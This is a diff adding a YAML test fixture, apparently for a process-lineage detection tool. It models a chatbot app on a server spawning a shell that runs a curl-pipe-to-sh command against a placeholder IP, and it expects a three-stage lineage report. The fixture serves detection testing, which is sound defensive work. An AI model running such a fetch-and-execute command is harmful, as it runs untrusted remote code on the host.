@@ -1,0 +1,32 @@
+subjects:
+  bash:
+    session: pid/200:1
+    program: /bin/bash
+    actors: [{id: u1, name: Ops, email: ops@example.com}]
+    device: srv-1
+    source: probe
+  chatbot:
+    session: pid/201:1
+    parent: bash
+    program: /opt/venv/bin/python3
+    actors: [{id: u1, name: Ops}]
+    device: srv-1
+    source: probe
+  sh:
+    session: pid/202:1
+    parent: chatbot
+    program: /bin/sh
+    actors: [{id: u1, name: Ops}]
+    device: srv-1
+    source: probe
+observations:
+  - {kind: session_start, subject: bash}
+  - {kind: spawn, subject: chatbot, cmdline: "python3 /opt/LLM-As-Chatbot/app.py --share"}
+  - {kind: spawn, subject: sh, cmdline: "sh -c 'curl -s http://203.0.113.9/p.sh | sh'"}
+  - {kind: connect, subject: sh, host: 203.0.113.9, port: 80, protocol: tcp}
+trigger: 2
+expect:
+  action: report
+  reason_contains: "3 stages"
+  output_contains: ["lineage: sh -> python3 -> bash"]
+  chain_min: 3
